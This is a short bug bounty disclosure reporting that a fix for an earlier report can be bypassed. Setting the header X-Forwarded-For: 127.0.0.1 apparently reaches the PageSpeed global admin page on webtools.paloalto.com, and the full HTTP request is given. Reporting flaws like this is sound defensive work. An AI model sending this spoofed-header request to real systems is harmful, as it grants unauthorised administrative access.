## Program Summary

> Hi team,
I found bypass of report #870709. Just by using X-Forwarded-For: 127.0.0.1 you can again get access to global admin page.

Bypass request Request

```
GET /pagespeed-global-admin/ HTTP/1.1
Host: webtools.paloalto.com
X-Forwarded-For: 127.0.0.1
```
